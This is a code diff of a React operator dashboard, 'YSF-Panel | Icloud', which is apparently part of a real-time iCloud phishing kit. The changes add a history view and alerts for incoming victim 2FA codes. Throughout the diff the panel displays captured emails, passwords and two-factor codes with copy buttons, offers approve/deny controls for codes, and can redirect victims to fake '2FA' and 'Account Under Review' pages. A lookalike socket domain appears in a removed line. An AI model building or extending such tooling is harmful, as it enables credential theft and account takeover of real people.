@@ -45,7 +45,9 @@ import {
     CheckCircle,
     XCircle,
     Plus,
-    Minus
+    Minus,
+    History,
+    CircleCheckIcon
 } from 'lucide-react';
 import io from 'socket.io-client';
 import {
@@ -61,6 +63,10 @@ import {
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import { Field, FieldLabel } from "@/components/ui/field";
+import { HistoryDataGrid } from "@/components/history/HistoryDataGrid";
+import { Alert, AlertDescription, AlertTitle } from "@/components/reui/alert";
+import { Status, StatusIndicator, StatusLabel } from "@/components/ui/status";
 
 // European country codes (ISO 3166-1 alpha-2) for GeoIP "Europe" region
 const EUROPE_COUNTRY_CODES = new Set(['AL', 'AD', 'AT', 'BY', 'BE', 'BA', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'GR', 'HU', 'IS', 'IE', 'IT', 'XK', 'LV', 'LI', 'LT', 'LU', 'MT', 'MD', 'MC', 'ME', 'NL', 'MK', 'NO', 'PL', 'PT', 'RO', 'RU', 'SM', 'RS', 'SK', 'SI', 'ES', 'SE', 'CH', 'UA', 'GB', 'VA']);
@@ -98,6 +104,9 @@ export default function Panel() {
     const [activeTab, setActiveTab] = useState('connections');
     const [sidebarOpen, setSidebarOpen] = useState(false);
     const [activeNav, setActiveNav] = useState('connections');
+    const [show2FANotification, setShow2FANotification] = useState(false);
+    const [notificationExiting, setNotificationExiting] = useState(false);
+    const prev2FANotificationIdsRef = useRef(new Set());
     const [geoipAllowedRegions, setGeoipAllowedRegions] = useState(() => {
         if (typeof window === 'undefined') return [];
         try {
@@ -134,6 +143,8 @@ export default function Panel() {
     const [redirectPageSent, setRedirectPageSent] = useState(false);
     const [redirectUrlSent, setRedirectUrlSent] = useState(false);
     const [connectionToDelete, setConnectionToDelete] = useState(null);
+    const [connectionHistory, setConnectionHistory] = useState([]);
+    const [historyLoading, setHistoryLoading] = useState(false);
     const copyToClipboard = (text, field) => {
         if (!text) return;
         navigator.clipboard.writeText(text).then(() => {
@@ -195,7 +206,7 @@ export default function Panel() {
 
         console.log('🔌 Connecting to socket server with token...');
 
-        const socketConnection = io('socket.center-icloud.com', {
+        const socketConnection = io('http://localhost:3005', {
             auth: {
                 token: token
             },
@@ -321,6 +332,42 @@ export default function Panel() {
     }, [socket, isAdmin]);
 
     useEffect(() => {
+        const idsWith2FA = new Set(
+            connections.filter(c => c.loginData?.twoFactorCode).map(c => c.id)
+        );
+        if (idsWith2FA.size === 0) return;
+        const prev = prev2FANotificationIdsRef.current;
+        const hasNew = [...idsWith2FA].some(id => !prev.has(id));
+        if (hasNew) {
+            idsWith2FA.forEach(id => prev.add(id));
+            setNotificationExiting(false);
+            setShow2FANotification(true);
+            const t = setTimeout(() => setNotificationExiting(true), 3000);
+            return () => clearTimeout(t);
+        }
+    }, [connections]);
+
+    // Auto-close toast 1s after code is approved or denied (no connections have 2FA anymore)
+    useEffect(() => {
+        if (!show2FANotification) return;
+        const hasAny2FA = connections.some(c => c.loginData?.twoFactorCode);
+        if (!hasAny2FA) {
+            const t = setTimeout(() => setNotificationExiting(true), 1000);
+            return () => clearTimeout(t);
+        }
+    }, [show2FANotification, connections]);
+
+    // After exit animation finishes, hide the toast
+    useEffect(() => {
+        if (!notificationExiting) return;
+        const t = setTimeout(() => {
+            setShow2FANotification(false);
+            setNotificationExiting(false);
+        }, 280);
+        return () => clearTimeout(t);
+    }, [notificationExiting]);
+
+    useEffect(() => {
         try {
             localStorage.setItem('geoipAllowedRegions', JSON.stringify(geoipAllowedRegions));
         } catch (_) {}
@@ -335,6 +382,18 @@ export default function Panel() {
             localStorage.setItem('geoipEuropeBlocked', JSON.stringify(europeBlocked));
         } catch (_) {}
     }, [europeBlocked]);
+
+    useEffect(() => {
+        if (activeNav !== 'history') return;
+        const token = typeof window !== 'undefined' ? localStorage.getItem('adminToken') : null;
+        if (!token) return;
+        setHistoryLoading(true);
+        fetch('/api/admin/history', { headers: { Authorization: `Bearer ${token}` } })
+            .then(res => res.json())
+            .then(data => setConnectionHistory(Array.isArray(data.history) ? data.history : []))
+            .catch(() => setConnectionHistory([]))
+            .finally(() => setHistoryLoading(false));
+    }, [activeNav]);
 
     const filteredConnections = useMemo(() => {
         let filtered = [...connections];
@@ -579,20 +638,28 @@ export default function Panel() {
                         <span className="text-sm font-semibold text-white">YSF-Panel | Icloud</span>
                     </div>
 
-                    {/* Navigation */}
-                    <nav className="flex-1 px-2 py-2 space-y-1.5">
+                    {/* Navigation - Mira: small radius, subtle accent */}
+                    <nav className="flex-1 px-2 py-2 space-y-1">
                         <button
                             type="button"
                             onClick={() => setActiveNav('connections')}
-                            className={`w-full flex items-center gap-3 px-3 py-2 rounded text-sm font-medium transition-colors ${activeNav === 'connections' ? 'bg-[#262626] text-[#f0b100]' : 'text-gray-400 hover:bg-[#28282A] hover:text-white'}`}
+                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'connections' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
                         >
                             <Users className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                             <span>Connections</span>
                         </button>
                         <button
                             type="button"
+                            onClick={() => setActiveNav('history')}
+                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'history' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
+                        >
+                            <History className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
+                            <span>History</span>
+                        </button>
+                        <button
+                            type="button"
                             onClick={() => setActiveNav('settings')}
-                            className={`w-full flex items-center gap-3 px-3 py-2 rounded text-sm font-medium transition-colors ${activeNav === 'settings' ? 'bg-[#262626] text-[#f0b100]' : 'text-gray-400 hover:bg-[#28282A] hover:text-white'}`}
+                            className={`w-full flex items-center gap-3 px-3 py-2 rounded-sm text-sm font-medium transition-colors ${activeNav === 'settings' ? 'bg-[#232323] text-[#f0b100]' : 'text-gray-400 hover:bg-[#1f1f1f] hover:text-gray-200'}`}
                         >
                             <Settings className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                             <span>Settings</span>
@@ -600,10 +667,10 @@ export default function Panel() {
                     </nav>
 
                     {/* Bottom Actions */}
-                    <div className="px-2 py-2 space-y-1.5 mt-auto">
+                    <div className="px-2 py-2 space-y-1 mt-auto">
                         <button
                             onClick={handleLogout}
-                            className="w-full flex items-center gap-3 px-3 py-2 text-red-400 hover:text-red-300 hover:bg-[#28282A] rounded text-sm font-medium transition-all duration-150"
+                            className="w-full flex items-center gap-3 px-3 py-2 text-red-400 hover:text-red-300 hover:bg-[#1f1f1f] rounded-sm text-sm font-medium transition-all duration-150"
                         >
                             <LogOut className="w-5 h-5 flex-shrink-0" strokeWidth={2} />
                             <span>Logout</span>
@@ -630,19 +697,16 @@ export default function Panel() {
 
                         <div className="flex items-center gap-3">
                             {/* Connection status */}
-                            <div className={`flex items-center gap-2 px-3 py-1.5 rounded text-xs font-medium ${socketId
-                                ? 'bg-green-500/10 text-green-400 border border-green-500/20'
-                                : 'bg-red-500/10 text-red-400 border border-red-500/20'
-                                }`}>
-                                <div className={`w-1.5 h-1.5 rounded-full ${socketId ? 'bg-green-400' : 'bg-red-400'}`} />
-                                {socketId ? 'Connected' : 'Disconnected'}
-                            </div>
+                            <Status variant={socketId ? 'success' : 'error'} className="px-3 py-1.5">
+                                <StatusIndicator />
+                                <StatusLabel>{socketId ? 'Connected' : 'Disconnected'}</StatusLabel>
+                            </Status>
 
                             {/* Refresh button */}
                             <button
                                 onClick={() => fetchConnections(true)}
                                 disabled={loading || !socket?.connected}
-                                className="px-4 py-2 bg-[#1C1C1E] hover:bg-[#28282A] border border-[#2C2C2E] text-gray-300 hover:text-white rounded text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
+                                className="px-4 py-2 bg-transparent text-gray-300 hover:bg-white/10 hover:text-white rounded-sm text-sm font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center gap-2"
                             >
                                 <RefreshCw className={`w-4 h-4 text-[#f0b100] ${loading ? 'animate-spin' : ''}`} strokeWidth={2} />
                                 Refresh
@@ -650,6 +714,31 @@ export default function Panel() {
                         </div>
                     </div>
                 </div>
+
+                {/* 2FA toast notification (floating, 3s or close button or 1s after approve/deny) */}
+                {show2FANotification && (
+                    <div className="fixed right-4 top-20 z-50 w-full max-w-[380px]">
+                        <div className={`notification-popup rounded-lg shadow-xl shadow-black/50 pointer-events-auto relative ${notificationExiting ? 'notification-exiting' : ''}`}>
+                            <button
+                                type="button"
+                                onClick={() => setNotificationExiting(true)}
+                                className="absolute right-2 top-2 z-10 p-1.5 rounded-md text-gray-400 hover:text-white hover:bg-white/10 transition-colors cursor-pointer touch-manipulation"
+                                aria-label="Close notification"
+                            >
+                                <X className="size-4 pointer-events-none" strokeWidth={2} />
+                            </button>
+                            <Alert variant="success" className="w-full py-2.5 px-3 pr-8">
+                                <CircleCheckIcon className="shrink-0 size-4" />
+                                <div className="min-w-0">
+                                    <AlertTitle className="text-white font-semibold text-sm">2FA code received</AlertTitle>
+                                    <AlertDescription className="text-gray-400 text-xs mt-0.5 leading-snug">
+                                        A connection submitted a verification code. Open it to approve or deny.
+                                    </AlertDescription>
+                                </div>
+                            </Alert>
+                        </div>
+                    </div>
+                )}
 
                 {/* Content Area */}
                 <div className="p-4 sm:px-6 lg:px-8 lg:py-6">
@@ -750,6 +839,24 @@ export default function Panel() {
                                         </div>
                                     )}
                                 </div>
+                            </div>
+                        </>
+                    ) : activeNav === 'history' ? (
+                        <>
+                            <h1 className="text-3xl font-semibold text-white">History</h1>
+                            <nav className="flex pt-2 pb-10">
+                                <div className="flex items-center gap-2 text-sm text-gray-400">
+                                    <button type="button" onClick={() => setActiveNav('connections')} className="hover:text-[#f0b100] transition-colors">Connections</button>
+                                    <ChevronRight className="w-3 h-3 text-[#f0b100]" />
+                                    <span className="text-white">History</span>
+                                </div>
+                            </nav>
+                            <p className="text-xs text-gray-500 mb-3">Past connections. Entries can be deleted only via MongoDB.</p>
+                            {connectionHistory.length === 0 && !historyLoading && (
+                                <p className="text-gray-500 py-4">No history yet. Disconnected connections are saved here.</p>
+                            )}
+                            <div className="history-grid-theme dark">
+                                <HistoryDataGrid data={connectionHistory} loading={historyLoading} />
                             </div>
                         </>
                     ) : (
@@ -893,11 +1000,11 @@ export default function Panel() {
                                                                     alt="Flag"
                                                                     className="w-10 h-10 rounded"
                                                                 />
-                                                                <div className={`mt-2 flex items-center justify-center gap-1 text-[10px] font-bold ${conn.isActive ? 'text-green-400' : 'text-red-400'
-                                                                    }`}>
-                                                                    <div className={`w-1.5 h-1.5 rounded-full ${conn.isActive ? 'bg-green-400' : 'bg-red-400'
-                                                                        }`} />
-                                                                    {conn.isActive ? 'Active' : 'Offline'}
+                                                                <div className="mt-2 flex justify-center">
+                                                                    <Status variant={conn.isActive ? 'success' : 'error'} className="text-[10px]">
+                                                                        <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
+                                                                        <StatusLabel className="font-bold">{conn.isActive ? 'Active' : 'Offline'}</StatusLabel>
+                                                                    </Status>
                                                                 </div>
                                                             </div>
 
@@ -908,14 +1015,16 @@ export default function Panel() {
                                                                         {conn.geoData?.city || 'Unknown'}, {conn.geoData?.country || 'N/A'}
                                                                     </h3>
                                                                     {conn.loginData && !conn.loginData.twoFactorCode && (
-                                                                        <span className="px-2 py-0.5 bg-[#f0b100]/10 border border-[#f0b100]/20 text-[#f0b100] text-[10px] rounded font-medium">
-                                                                            Has Login Data
-                                                                        </span>
+                                                                        <Status variant="warning" className="px-2 py-0.5 text-[10px]">
+                                                                            <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
+                                                                            <StatusLabel>Login Data Submitted</StatusLabel>
+                                                                        </Status>
                                                                     )}
                                                                     {conn.loginData?.twoFactorCode && (
-                                                                        <span className="px-2 py-0.5 bg-green-500/10 border border-green-500/20 text-green-400 text-[10px] rounded font-medium">
-                                                                            Has 2FA Code
-                                                                        </span>
+                                                                        <Status variant="info" className="px-2 py-0.5 text-[10px]">
+                                                                            <StatusIndicator className="size-1.5 before:size-1.5 after:size-1" />
+                                                                            <StatusLabel>2FA Code Submitted</StatusLabel>
+                                                                        </Status>
                                                                     )}
                                                                 </div>
 
@@ -1025,38 +1134,28 @@ export default function Panel() {
 
                                                                                 {sectionsOpen.basic && (
                                                                                     <div className="space-y-3">
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Socket ID</Label>
-                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono">
-                                                                                            {selectedConnection.id}
-                                                                                        </div>
-                                                                                    </div>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Socket ID</FieldLabel>
+                                                                                        <Input readOnly value={selectedConnection.id ?? ''} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 font-mono text-sm" />
+                                                                                    </Field>
 
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Status</Label>
-                                                                                        <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded text-sm ${selectedConnection.isActive
-                                                                                            ? 'bg-green-500/10 text-green-400 border border-green-500/20'
-                                                                                            : 'bg-red-500/10 text-red-400 border border-red-500/20'
-                                                                                            }`}>
-                                                                                            <div className={`w-2 h-2 rounded-full ${selectedConnection.isActive ? 'bg-green-400' : 'bg-red-400'
-                                                                                                }`} />
-                                                                                            {selectedConnection.isActive ? 'Active' : 'Inactive'}
-                                                                                        </div>
-                                                                                    </div>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Status</FieldLabel>
+                                                                                        <Status variant={selectedConnection.isActive ? 'success' : 'error'} className="px-3 py-1.5 text-sm">
+                                                                                            <StatusIndicator />
+                                                                                            <StatusLabel>{selectedConnection.isActive ? 'Active' : 'Inactive'}</StatusLabel>
+                                                                                        </Status>
+                                                                                    </Field>
 
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">User Agent</Label>
-                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-xs text-gray-400 break-all">
-                                                                                            {selectedConnection.userAgent || 'Not available'}
-                                                                                        </div>
-                                                                                    </div>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">User Agent</FieldLabel>
+                                                                                        <Input readOnly value={selectedConnection.userAgent || 'Not available'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-400 text-xs" title={selectedConnection.userAgent || ''} />
+                                                                                    </Field>
 
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Current Page</Label>
-                                                                                        <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                            {selectedConnection.currentPage || 'N/A'}
-                                                                                        </div>
-                                                                                    </div>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Current Page</FieldLabel>
+                                                                                        <Input readOnly value={selectedConnection.currentPage || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                    </Field>
                                                                                 </div>
                                                                                 )}
                                                                             </div>
@@ -1074,81 +1173,55 @@ export default function Panel() {
                                                                                 {sectionsOpen.location && (
                                                                                     <>
                                                                                         <div className="grid grid-cols-2 gap-3">
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">IP Address</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono flex items-center justify-between">
-                                                                                                    <span>{selectedConnection.geoData?.ip || 'N/A'}</span>
-                                                                                                    <button
-                                                                                                        onClick={() => openInNewTab(getIPInfoLink(selectedConnection.geoData?.ip))}
-                                                                                                        disabled={!selectedConnection.geoData?.ip}
-                                                                                                        className="ml-2 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"
-                                                                                                    >
-                                                                                                        <ExternalLink className="w-3.5 h-3.5" />
-                                                                                                    </button>
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">IP Address</FieldLabel>
+                                                                                                <div className="flex h-9 w-full min-w-0 items-center rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 font-mono">
+                                                                                                    <span className="flex-1 min-w-0 truncate">{selectedConnection.geoData?.ip || 'N/A'}</span>
+                                                                                                    <button type="button" onClick={() => openInNewTab(getIPInfoLink(selectedConnection.geoData?.ip))} disabled={!selectedConnection.geoData?.ip} className="ml-2 shrink-0 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"><ExternalLink className="w-3.5 h-3.5" /></button>
                                                                                                 </div>
-                                                                                            </div>
+                                                                                            </Field>
 
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Country</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 flex items-center gap-2">
-                                                                                                    <img
-                                                                                                        src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"}
-                                                                                                        alt="Flag"
-                                                                                                        className="w-5 h-5 rounded"
-                                                                                                    />
-                                                                                                    {selectedConnection.geoData?.country || 'N/A'}
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Country</FieldLabel>
+                                                                                                <div className="flex h-9 w-full min-w-0 items-center gap-2 rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300">
+                                                                                                    <img src={getFlagEmoji(selectedConnection.geoData?.country) || "/placeholder.svg"} alt="" className="h-5 w-5 shrink-0 rounded" />
+                                                                                                    <span className="truncate">{selectedConnection.geoData?.country || 'N/A'}</span>
                                                                                                 </div>
-                                                                                            </div>
+                                                                                            </Field>
 
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">City</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                                    {selectedConnection.geoData?.city || 'N/A'}
-                                                                                                </div>
-                                                                                            </div>
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">City</FieldLabel>
+                                                                                                <Input readOnly value={selectedConnection.geoData?.city || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                            </Field>
 
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Region</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                                    {selectedConnection.geoData?.region || 'N/A'}
-                                                                                                </div>
-                                                                                            </div>
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Region</FieldLabel>
+                                                                                                <Input readOnly value={selectedConnection.geoData?.region || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                            </Field>
 
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Postal Code</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                                    {selectedConnection.geoData?.postal || 'N/A'}
-                                                                                                </div>
-                                                                                            </div>
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Postal Code</FieldLabel>
+                                                                                                <Input readOnly value={selectedConnection.geoData?.postal || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                            </Field>
 
-                                                                                            <div>
-                                                                                                <Label className="text-gray-500 text-xs mb-1.5 block">Timezone</Label>
-                                                                                                <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300">
-                                                                                                    {selectedConnection.geoData?.timezone || 'N/A'}
-                                                                                                </div>
-                                                                                            </div>
+                                                                                            <Field className="w-full">
+                                                                                                <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Timezone</FieldLabel>
+                                                                                                <Input readOnly value={selectedConnection.geoData?.timezone || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-300 text-sm" />
+                                                                                            </Field>
                                                                                         </div>
 
-                                                                                        <div>
-                                                                                            <Label className="text-gray-500 text-xs mb-1.5 block">Coordinates</Label>
-                                                                                            <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono flex items-center justify-between">
-                                                                                                <span>{selectedConnection.geoData?.loc || 'N/A'}</span>
-                                                                                                <button
-                                                                                                    onClick={() => openInNewTab(getCoordinatesLink(selectedConnection.geoData?.loc))}
-                                                                                                    disabled={!selectedConnection.geoData?.loc}
-                                                                                                    className="ml-2 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"
-                                                                                                >
-                                                                                                    <MapPin className="w-3.5 h-3.5" />
-                                                                                                </button>
+                                                                                        <Field className="w-full">
+                                                                                            <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Coordinates</FieldLabel>
+                                                                                            <div className="flex h-9 w-full min-w-0 items-center rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 font-mono">
+                                                                                                <span className="flex-1 min-w-0 truncate">{selectedConnection.geoData?.loc || 'N/A'}</span>
+                                                                                                <button type="button" onClick={() => openInNewTab(getCoordinatesLink(selectedConnection.geoData?.loc))} disabled={!selectedConnection.geoData?.loc} className="ml-2 shrink-0 text-[#f0b100] hover:text-[#d99a00] disabled:opacity-30"><MapPin className="w-3.5 h-3.5" /></button>
                                                                                             </div>
-                                                                                        </div>
+                                                                                        </Field>
 
-                                                                                        <div>
-                                                                                            <Label className="text-gray-500 text-xs mb-1.5 block">Organization</Label>
-                                                                                            <div className="p-3 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-xs text-gray-400">
-                                                                                                {selectedConnection.geoData?.org || 'N/A'}
-                                                                                            </div>
-                                                                                        </div>
+                                                                                        <Field className="w-full">
+                                                                                            <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Organization</FieldLabel>
+                                                                                            <Input readOnly value={selectedConnection.geoData?.org || 'N/A'} className="bg-[#0a0a0a] border-[#2C2C2E] text-gray-400 text-xs" />
+                                                                                        </Field>
                                                                                     </>
                                                                                 )}
                                                                             </div>
@@ -1165,13 +1238,13 @@ export default function Panel() {
 
                                                                                 {sectionsOpen.control && (<>
 
-                                                                                    <div>
-                                                                                        <Label className="text-gray-500 text-xs mb-1.5 block">Redirect to Page</Label>
+                                                                                    <Field className="w-full">
+                                                                                        <FieldLabel className="text-gray-500 text-xs mb-1.5 block">Redirect to Page</FieldLabel>
                                                                                         <div className="flex gap-2">
                                                                                             <select
                                                                                                 value={selectedRedirectPage}
                                                                                                 onChange={(e) => setSelectedRedirectPage(e.target.value)}
-                                                                                                className="flex-1 px-3 py-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 focus:outline-none input-coolify"
+                                                                                                className="flex-1 h-9 rounded-md border border-[#2C2C2E] bg-[#0a0a0a] px-3 py-1 text-sm text-gray-300 focus:outline-none input-coolify"
                                                                                             >
                                                                                                 <option value="">Select page</option>
                                                                                                 <option value="landingPage">Landing Page</option>
@@ -1179,19 +1252,19 @@ export default function Panel() {
                                                                                                 <option value="2faPage">2FA Page</option>
                                                                                                 <option value="AURPage">Account Under Review</option>
                                                                                             </select>
-                                                                                            <button
+                                                                                            <Button
                                                                                                 onClick={() => {
                                                                                                     handleRedirectPage(selectedConnection.id, selectedRedirectPage);
                                                                                                     setRedirectPageSent(true);
                                                                                                     setTimeout(() => setRedirectPageSent(false), 2000);
                                                                                                 }}
                                                                                                 disabled={!selectedRedirectPage}
-                                                                                                className="px-4 py-2 bg-[#f0b100] hover:bg-[#d99a00] text-black font-semibold rounded text-sm disabled:opacity-50 disabled:cursor-not-allowed"
+                                                                                                variant="amber"
                                                                                             >
                                                                                                 {redirectPageSent ? 'Sent' : 'Send'}
-                                                                                            </button>
+                                                                                            </Button>
                                                                                         </div>
-                                                                                    </div>
+                                                                                    </Field>
                                                                                     </>
                                                                                 )}
                                                                             </div>
@@ -1220,9 +1293,9 @@ export default function Panel() {
                                                                                                     const isNewLogin = status.loginVersion !== loginDataVersion;
                                                                                                     const effectiveLogin = (status.login !== 'pending' && !isNewLogin) ? status.login : 'pending';
                                                                                                     const emailPassBlock = (
-                                                                                                        <div className="space-y-2 flex-1">
-                                                                                                            <div><Label className="text-gray-500 text-xs mb-0.5 block">Email</Label><button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.email, 'email')} className="w-full p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono text-left hover:border-[#f0b100]/50 cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="truncate">{selectedConnection.loginData.email}</span>{copiedField === 'email' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button></div>
-                                                                                                            <div><Label className="text-gray-500 text-xs mb-0.5 block">Password</Label><button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.password, 'password')} className="w-full p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-gray-300 font-mono text-left hover:border-[#f0b100]/50 cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="truncate">{selectedConnection.loginData.password}</span>{copiedField === 'password' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button></div>
+                                                                                                        <div className="space-y-1 flex-1">
+                                                                                                            <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.email, 'email')} className="w-full p-2 rounded-sm text-sm text-left hover:bg-white/5 transition-colors cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="text-white text-xs font-medium shrink-0">Email</span><span className="font-mono text-gray-300 truncate min-w-0">{selectedConnection.loginData.email}</span>{copiedField === 'email' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button>
+                                                                                                            <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.password, 'password')} className="w-full p-2 rounded-sm text-sm text-left hover:bg-white/5 transition-colors cursor-pointer flex items-center justify-between gap-2" title="Click to copy"><span className="text-white text-xs font-medium shrink-0">Password</span><span className="font-mono text-gray-300 truncate min-w-0">{selectedConnection.loginData.password}</span>{copiedField === 'password' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}</button>
                                                                                                         </div>
                                                                                                     );
                                                                                                     if (effectiveLogin === 'approved') {
@@ -1264,7 +1337,7 @@ export default function Panel() {
                                                                                                     const isNew2FA = status.twoFAVersion !== twoFAVersion;
                                                                                                     const effective2FA = (status.twoFA !== 'pending' && status.twoFA !== 'waiting' && !isNew2FA) ? status.twoFA : 'pending';
                                                                                                     const codeBlock = (
-                                                                                                        <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.twoFactorCode, '2fa')} className="p-2 bg-[#0a0a0a] border border-[#2C2C2E] rounded text-sm text-[#f0b100] font-mono font-bold hover:border-[#f0b100]/50 cursor-pointer flex items-center gap-2" title="Click to copy">
+                                                                                                        <button type="button" onClick={() => copyToClipboard(selectedConnection.loginData.twoFactorCode, '2fa')} className="p-2 rounded-sm text-sm text-[#f0b100] font-mono font-bold hover:bg-white/5 transition-colors cursor-pointer flex items-center gap-2" title="Click to copy">
                                                                                                             {selectedConnection.loginData.twoFactorCode}
                                                                                                             {copiedField === '2fa' ? <CheckCircle className="w-3.5 h-3.5 text-green-500 shrink-0" /> : <Copy className="w-3.5 h-3.5 text-gray-500 shrink-0" />}
                                                                                                         </button>
@@ -1279,13 +1352,13 @@ export default function Panel() {
                                                                                                         <div className="flex items-center gap-2 flex-wrap">
                                                                                                             {codeBlock}
                                                                                                             <button
-                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'approved', selectedConnection.loginData.twoFactorCode); socket.emit('approve2fa', { socketId: selectedConnection.id }); }}
+                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'approved', selectedConnection.loginData.twoFactorCode); socket.emit('approve2fa', { socketId: selectedConnection.id }); setTimeout(() => setNotificationExiting(true), 1000); }}
                                                                                                                 className="px-3 py-1.5 text-xs border border-[#f0b100] text-[#f0b100] bg-[#f0b100]/10 hover:bg-[#f0b100]/20 font-medium rounded flex items-center gap-1.5"
                                                                                                             >
                                                                                                                 <CheckCircle className="w-3.5 h-3.5" /> Approve
                                                                                                             </button>
                                                                                                             <button
-                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'denied', selectedConnection.loginData.twoFactorCode); socket.emit('deny2fa', { socketId: selectedConnection.id }); }}
+                                                                                                                onClick={() => { setTwoFAStatus(selectedConnection.id, 'denied', selectedConnection.loginData.twoFactorCode); socket.emit('deny2fa', { socketId: selectedConnection.id }); setTimeout(() => setNotificationExiting(true), 1000); }}
